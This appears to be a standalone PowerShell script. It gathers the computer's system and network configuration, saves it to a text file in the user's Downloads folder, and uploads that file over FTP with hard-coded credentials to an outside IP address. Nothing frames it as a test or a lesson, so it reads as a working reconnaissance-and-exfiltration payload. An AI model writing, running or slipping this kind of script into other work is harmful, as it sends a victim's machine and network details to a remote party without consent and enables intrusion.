﻿$value = Get-ComputerInfo
$ip = Get-NetIPConfiguration
$value, $ip | Out-File -FilePath C:\Users\$env:UserName\Downloads\test.txt
$web=New-Object System.Net.WebClient
$file = "C:\Users\$env:UserName\Downloads\test.txt"
$FTP = "ftp://testadmin:testpassword@192.119.71.89/files/test.txt"
$URI = New-Object System.Uri($FTP)
$web.UploadFile($URI, $file)



